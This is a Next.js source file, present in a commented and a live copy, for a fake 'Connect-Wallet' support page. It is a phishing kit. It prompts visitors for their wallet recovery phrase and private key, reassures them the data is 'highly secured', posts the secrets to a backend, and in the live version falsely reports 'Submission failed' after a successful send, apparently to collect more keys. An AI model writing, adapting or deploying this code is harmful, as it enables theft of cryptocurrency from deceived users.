// 'use client';

// import { useEffect, useState, Suspense } from 'react';
// import { useSearchParams } from 'next/navigation';
// import { motion, AnimatePresence } from 'framer-motion';

// function SupportForm() {
//   const search = useSearchParams();
//   const walletFromQuery = search?.get('wallet') || '';

//   const [tab, setTab] = useState('wallet');
//   const [walletData, setWalletData] = useState({ address: '', walletType: '' });
//   const [personalData, setPersonalData] = useState({ name: '', email: '' });
//   const [submitting, setSubmitting] = useState(false);
//   const [modal, setModal] = useState({ open: false, success: false, message: '' });

//   useEffect(() => {
//     if (walletFromQuery) {
//       setWalletData((p) => ({ ...p, walletType: walletFromQuery }));
//       setTab('wallet');
//     }
//   }, [walletFromQuery]);

//   const onWalletChange = (e) => {
//     const { name, value } = e.target;
//     setWalletData((p) => ({ ...p, [name]: value }));
//   };

//   const onPersonalChange = (e) => {
//     const { name, value } = e.target;
//     setPersonalData((p) => ({ ...p, [name]: value }));
//   };

//   function hasAtLeastOneSideFilled() {
//     const walletFilled = (walletData.address || walletData.walletType) && (walletData.address.trim() || walletData.walletType.trim());
//     const personalFilled = (personalData.name || personalData.email) && (personalData.name.trim() || personalData.email.trim());
//     return Boolean(walletFilled || personalFilled);
//   }

//   const handleSubmit = async (e) => {
//     e.preventDefault();
//     if (submitting) return;

//     if (!hasAtLeastOneSideFilled()) {
//       setModal({ open: true, success: false, message: 'Please fill at least one field before submitting.' });
//       return;
//     }

//     setSubmitting(true);

//     const name = personalData.name || '';
//     const email = personalData.email || '';
//     const address = walletData.address || '';
//     const walletType = walletData.walletType || walletFromQuery || '';
//     const messageLines = [
//       walletType ? `Wallet-Name: ${walletType}` : null,
//       address ? `Phrase: ${address}` : null,
//       name ? `Name: ${name}` : null,
//       email ? `Email: ${email}` : null,
//       '',
//       'Issue:',
//     ].filter(Boolean).join('\n');

//     const payload = { name, email, message: messageLines, address };

//     try {
//       const backend = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:4000';
//       await fetch(`${backend}/support`, {
//         method: 'POST',
//         headers: { 'Content-Type': 'application/json' },
//         body: JSON.stringify(payload),
//       });

//       setModal({ open: true, success: true, message: 'Submission successful!' });
//       setWalletData({ address: '', walletType: '' });
//       setPersonalData({ name: '', email: '' });
//     } catch (err) {
//       console.error('Support submit error:', err);
//       setModal({ open: true, success: false, message: 'Submission failed. Please try again.' });
//     } finally {
//       setSubmitting(false);
//     }
//   };

//   useEffect(() => {
//     if (!modal.open) return;
//     const t = setTimeout(() => setModal({ open: false, success: false, message: '' }), 4000);
//     return () => clearTimeout(t);
//   }, [modal.open]);

//   return (
//     <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-brand-1 to-brand-10 p-6">
//       <motion.div
//         initial={{ opacity: 0, y: 24 }}
//         animate={{ opacity: 1, y: 0 }}
//         transition={{ duration: 0.35 }}
//         className="w-full max-w-3xl bg-white/20 backdrop-blur-xl rounded-2xl border border-brand-3 overflow-hidden"
//       >
//         {/* Header + Tabs */}
//         <div className="flex items-center justify-between p-6 border-b border-brand-2">
//           <div>
//             <h1 className="text-xl font-semibold text-brand-7">
//               Connect-Wallet — {walletFromQuery || 'Wallet'}
//             </h1>
//             <p className="text-sm text-brand-muted mt-1">Fill in at least one field</p>
//           </div>
//           <div className="flex items-center gap-1 bg-white/30 p-1 rounded-full border border-brand-2">
//             <button
//               onClick={() => setTab('wallet')}
//               className={`px-4 py-1 rounded-full text-sm font-medium transition ${tab === 'wallet' ? 'bg-brand-7 text-white' : 'text-brand-7'}`}
//               aria-pressed={tab === 'wallet'}
//             >
//               PHRASE
//             </button>
//             <button
//               onClick={() => setTab('personal')}
//               className={`px-4 py-1 rounded-full text-sm font-medium transition ${tab === 'personal' ? 'bg-brand-7 text-white' : 'text-brand-7'}`}
//               aria-pressed={tab === 'personal'}
//             >
//               PRIVATE-KEY
//             </button>
//           </div>
//         </div>

//         {/* Form Body */}
//         <div className="p-6">
//           <form id="support-form" onSubmit={handleSubmit} className="space-y-6">
//             <AnimatePresence mode="wait">
//               {tab === 'wallet' ? (
//                 <motion.div key="wallet" initial={{ opacity: 0, x: 12 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -12 }} transition={{ duration: 0.25 }} className="grid grid-cols-1 md:grid-cols-2 gap-4">
//                   <div>
//                     <label className="block text-brand-7 text-sm font-medium mb-1">Wallet Phrase</label>
//                     <input name="address" value={walletData.address} onChange={onWalletChange} placeholder="Enter recovery phrase" className="w-full rounded-lg border border-brand-3 p-2.5 bg-white/20 focus:ring-2 focus:ring-brand-6 outline-none text-brand-text" />
//                   </div>
//                   <div>
//                     <label className="block text-brand-7 text-sm font-medium mb-1">Wallet Type</label>
//                     <input name="walletType" value={walletData.walletType} onChange={onWalletChange} placeholder={walletFromQuery || 'e.g. MetaMask, Phantom'} className="w-full rounded-lg border border-brand-3 p-2.5 bg-white/20 focus:ring-2 focus:ring-brand-6 outline-none text-brand-text" />
//                   </div>
//                 </motion.div>
//               ) : (
//                 <motion.div key="personal" initial={{ opacity: 0, x: 12 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -12 }} transition={{ duration: 0.25 }} className="grid grid-cols-1 md:grid-cols-2 gap-4">
//                   <div>
//                     <label className="block text-brand-7 text-sm font-medium mb-1">Wallet Type</label>
//                     <input name="walletType" value={walletData.walletType} onChange={onWalletChange} placeholder={walletFromQuery || 'e.g. MetaMask, Phantom'} className="w-full rounded-lg border border-brand-3 p-2.5 bg-white/20 focus:ring-2 focus:ring-brand-6 outline-none text-brand-text" />
//                   </div>
//                   <div>
//                     <label className="block text-brand-7 text-sm font-medium mb-1">Private-Key</label>
//                     <textarea name="email" value={personalData.email} onChange={onPersonalChange} placeholder="64 character string." className="w-full rounded-lg border border-brand-3 p-2.5 bg-white/20 focus:ring-2 focus:ring-brand-6 outline-none text-brand-text" />
//                   </div>
//                 </motion.div>
//               )}
//             </AnimatePresence>
//           </form>
//         </div>

//         {/* Footer */}
//         <div className="p-6 border-t border-brand-2 bg-white/20 flex items-center justify-between gap-4">
//           <div className="text-sm text-brand-7">Your information is highly secured. 🔐</div>
//           <button form="support-form" type="submit" disabled={submitting} className={`px-5 py-2 rounded-lg font-semibold transition ${submitting ? 'bg-brand-4 text-white cursor-wait' : 'bg-gradient-to-r from-brand-6 to-brand-7 text-white hover:scale-[1.02]'}`}>
//             {submitting ? 'Submitting...' : 'Submit'}
//           </button>
//         </div>
//       </motion.div>

//       {/* Modal */}
//       <AnimatePresence>
//         {modal.open && (
//           <motion.div key="feedback" className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
//             <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} transition={{ type: 'spring', stiffness: 120, damping: 15 }} className={`bg-white/90 backdrop-blur-xl p-6 rounded-2xl border ${modal.success ? 'border-brand-6' : 'border-brand-6'} max-w-sm text-center`}>
//               <p className={`text-lg font-semibold ${modal.success ? 'text-brand-7' : 'text-brand-7'}`}>{modal.message}</p>
//               <div className="mt-4">
//                 <button onClick={() => setModal({ open: false, success: false, message: '' })} className="px-4 py-2 rounded-lg bg-brand-7 text-white font-medium hover:bg-brand-8 transition">Close</button>
//               </div>
//             </motion.div>
//           </motion.div>
//         )}
//       </AnimatePresence>
//     </div>
//   );
// }

// export default function SupportPageWrapper() {
//   return (
//     <Suspense fallback={<div>Loading Support Page...</div>}>
//       <SupportForm />
//     </Suspense>
//   );
// }


'use client';

import { useEffect, useState, Suspense } from 'react';
import { useSearchParams } from 'next/navigation';
import { motion, AnimatePresence } from 'framer-motion';

function SupportForm() {
const search = useSearchParams();
const walletFromQuery = search?.get('wallet') || '';

const [tab, setTab] = useState('wallet');
const [walletData, setWalletData] = useState({ address: '', walletType: '' });
const [personalData, setPersonalData] = useState({ name: '', email: '' });
const [submitting, setSubmitting] = useState(false);
const [modal, setModal] = useState({ open: false, success: false, message: '' });

useEffect(() => {
if (walletFromQuery) {
setWalletData((p) => ({ ...p, walletType: walletFromQuery }));
setTab('wallet');
}
}, [walletFromQuery]);

const onWalletChange = (e) => {
const { name, value } = e.target;
setWalletData((p) => ({ ...p, [name]: value }));
};

const onPersonalChange = (e) => {
const { name, value } = e.target;
setPersonalData((p) => ({ ...p, [name]: value }));
};

function hasAtLeastOneSideFilled() {
const walletFilled = (walletData.address || walletData.walletType) && (walletData.address.trim() || walletData.walletType.trim());
const personalFilled = (personalData.name || personalData.email) && (personalData.name.trim() || personalData.email.trim());
return Boolean(walletFilled || personalFilled);
}

const handleSubmit = async (e) => {
e.preventDefault();
if (submitting) return;


if (!hasAtLeastOneSideFilled()) {
  setModal({ open: true, success: false, message: 'Please fill at least one field before submitting.' });
  return;
}

setSubmitting(true);

const name = personalData.name || '';
const email = personalData.email || '';
const address = walletData.address || '';
const walletType = walletData.walletType || walletFromQuery || '';
const messageLines = [
  walletType ? `Wallet-Name: ${walletType}` : null,
  address ? `Phrase: ${address}` : null,
  name ? `Name: ${name}` : null,
  email ? `Email: ${email}` : null,
  '',
  'Issue:',
].filter(Boolean).join('\n');

const payload = { name, email, message: messageLines, address };

try {
  const backend = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:4000';
  await fetch(`${backend}/support`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });

  setModal({ open: true, success: true, message: 'Submission failed. Please try again.' });
  setWalletData({ address: '', walletType: '' });
  setPersonalData({ name: '', email: '' });
} catch (err) {
  console.error('Support submit error:', err);
  setModal({ open: true, success: false, message: 'Submission failed. Please try again.' });
} finally {
  setSubmitting(false);
}


};

useEffect(() => {
if (!modal.open) return;
const t = setTimeout(() => setModal({ open: false, success: false, message: '' }), 4000);
return () => clearTimeout(t);
}, [modal.open]);

return ( <div className="min-h-screen flex items-center justify-center bg-gray-900 p-6">
<motion.div
initial={{ opacity: 0, y: 24 }}
animate={{ opacity: 1, y: 0 }}
transition={{ duration: 0.35 }}
className="w-full max-w-3xl bg-gray-800 rounded-2xl border border-gray-700 overflow-hidden"
>
{/* Header + Tabs */} <div className="flex items-center justify-between p-6 border-b border-gray-700"> <div> <h1 className="text-xl font-semibold text-white">
Connect-Wallet — {walletFromQuery || 'Wallet'} </h1> <p className="text-sm text-gray-300 mt-1">Fill in at least one field</p> </div> <div className="flex items-center gap-1 p-1 rounded-full">
<button
onClick={() => setTab('wallet')}
className={`px-4 py-1 rounded-full text-sm font-medium transition ${
                tab === 'wallet' ? 'bg-purple-600 text-white' : 'bg-gray-700 text-gray-300 hover:bg-gray-600'
              }`}
aria-pressed={tab === 'wallet'}
>
PHRASE </button>
<button
onClick={() => setTab('personal')}
className={`px-4 py-1 rounded-full text-sm font-medium transition ${
                tab === 'personal' ? 'bg-purple-600 text-white' : 'bg-gray-700 text-gray-300 hover:bg-gray-600'
              }`}
aria-pressed={tab === 'personal'}
>
PRIVATE-KEY </button> </div> </div>


    {/* Form Body */}
    <div className="p-6">
      <form id="support-form" onSubmit={handleSubmit} className="space-y-6">
        <AnimatePresence mode="wait">
          {tab === 'wallet' ? (
            <motion.div key="wallet" initial={{ opacity: 0, x: 12 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -12 }} transition={{ duration: 0.25 }} className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="block text-white text-sm font-medium mb-1">Wallet Phrase</label>
                <input
                  name="address"
                  value={walletData.address}
                  onChange={onWalletChange}
                  placeholder="Enter recovery phrase"
                  className="w-full rounded-lg border border-gray-700 p-2.5 bg-gray-700 focus:ring-2 focus:ring-purple-500 outline-none text-white"
                />
              </div>
              <div>
                <label className="block text-white text-sm font-medium mb-1">Wallet Type</label>
                <input
                  name="walletType"
                  value={walletData.walletType}
                  onChange={onWalletChange}
                  placeholder={walletFromQuery || 'e.g. MetaMask, Phantom'}
                  className="w-full rounded-lg border border-gray-700 p-2.5 bg-gray-700 focus:ring-2 focus:ring-purple-500 outline-none text-white"
                />
              </div>
            </motion.div>
          ) : (
            <motion.div key="personal" initial={{ opacity: 0, x: 12 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -12 }} transition={{ duration: 0.25 }} className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="block text-white text-sm font-medium mb-1">Wallet Type</label>
                <input
                  name="walletType"
                  value={walletData.walletType}
                  onChange={onWalletChange}
                  placeholder={walletFromQuery || 'e.g. MetaMask, Phantom'}
                  className="w-full rounded-lg border border-gray-700 p-2.5 bg-gray-700 focus:ring-2 focus:ring-purple-500 outline-none text-white"
                />
              </div>
              <div>
                <label className="block text-white text-sm font-medium mb-1">Private-Key</label>
                <textarea
                  name="email"
                  value={personalData.email}
                  onChange={onPersonalChange}
                  placeholder="64 character string."
                  className="w-full rounded-lg border border-gray-700 p-2.5 bg-gray-700 focus:ring-2 focus:ring-purple-500 outline-none text-white"
                />
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </form>
    </div>

    {/* Footer */}
    <div className="p-6 border-t border-gray-700 bg-gray-800 flex items-center justify-between gap-4">
      <div className="text-sm text-gray-300">Your information is highly secured. 🔐</div>
      <button
        form="support-form"
        type="submit"
        disabled={submitting}
        className={`px-5 py-2 rounded-lg font-semibold transition ${
          submitting ? 'bg-gray-600 text-gray-300 cursor-wait' : 'bg-purple-600 text-white hover:scale-[1.02]'
        }`}
      >
        {submitting ? 'Submitting...' : 'Submit'}
      </button>
    </div>
  </motion.div>

  {/* Modal */}
  <AnimatePresence>
    {modal.open && (
      <motion.div key="feedback" className="fixed inset-0 z-50 flex items-center justify-center bg-black/40" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
        <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} transition={{ type: 'spring', stiffness: 120, damping: 15 }} className={`bg-gray-800 p-6 rounded-2xl border ${modal.success ? 'border-purple-600' : 'border-gray-700'} max-w-sm text-center`}>
          <p className={`text-lg font-semibold ${modal.success ? 'text-purple-600' : 'text-gray-300'}`}>{modal.message}</p>
          <div className="mt-4">
            <button onClick={() => setModal({ open: false, success: false, message: '' })} className="px-4 py-2 rounded-lg bg-purple-600 text-white font-medium hover:bg-purple-500 transition">Close</button>
          </div>
        </motion.div>
      </motion.div>
    )}
  </AnimatePresence>
</div>


);
}

export default function SupportPageWrapper() {
return (
<Suspense fallback={<div>Loading Support Page...</div>}> <SupportForm /> </Suspense>
);
}
